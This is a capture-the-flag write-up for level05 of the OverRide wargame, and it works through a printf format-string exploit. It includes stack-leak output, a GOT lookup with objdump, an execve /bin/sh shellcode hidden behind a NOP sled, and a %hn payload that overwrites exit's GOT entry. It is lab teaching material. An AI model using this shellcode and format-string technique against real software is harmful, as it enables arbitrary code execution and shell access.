Here it's like the level5 from Rainfall; we have to use `printf` with a format string attack.
In short we will use the `%n` that give us the ability to write in a pointer to overwrite the address of `exit`
to the address of our shellcode

First we will find the offset to reach the address to the buffer containing our input :

```Shell
level05@OverRide:~$ ./level05
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
aaaa 0x64 0xf7fcfac0 0xf7ec3af9 0xffffd2bf 0xffffd2be (nil) 0xffffffff 0xffffd344 0xf7fdb000 0x61616161 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
```

Here the offset is `%10p`

Now we will get the address of `exit` from the Gobal Offset Table:

```Shell
level05@OverRide:~$ objdump -R level05

level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main
```

Here the address is `\xe0\x97\x04\x08` after convertion in little endian

Now we will get an address in the middle of the Nop sled of the shellcode

```Shell
export SHELLCODE=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
```

```
level05@OverRide:~$ gdb level05
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
(gdb) start
Temporary breakpoint 1 at 0x8048449
Starting program: /home/users/level05/level05

Temporary breakpoint 1, 0x08048449 in main ()
(gdb) x/300x $esp
...
0xffffd6c0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd6d0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd6e0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd6f0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd700:     0x90909090      0x90909090      0x90909090      0x90909090
...
```

We here we take `0xffffd6e0`
We will split our address in two part, `0xffff` that will be writen in the high order bytes
and `0xd6e0` that we will write in the low order bytes.

Since we want to write an address of 4 bytes on `\xe0\x97\x04\x08`, We will write the low order bytes on `\xe0\x97\x04\x08` and the 2 next bytes (high order bytes) on `\xe0\x97\x04\x08` + 2 => `\xe2\x97\x04\x08`

- Step 1: convert hexadecimal to decimal:
  high => 65535
  low => 55008

- Step 2: We substract 8 bytes that are already written by the address
  high => 65535
  low => 55008 - 8 = 55000

- Step 3: Since high order bytes are greater than the low order bytes we will substract the low order bytes (bytes already written) to the high order bytes (else it is the opposite and we write the high order bytes before).
  high => 65535 - 55008 = 10527
  low => 55000

Now we have to create the exploit :
[address where we will write the 2 low order bytes][address where we will write the 2 high order bytes][low order bytes][offset to our input (first address)][high order bytes][offset to our input + 4 (second address)]

```Shell
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55000c" + "%10$hn" + "%10527c" + "%11$hn"' > /tmp/a
cat /tmp/a - | ./level05
```
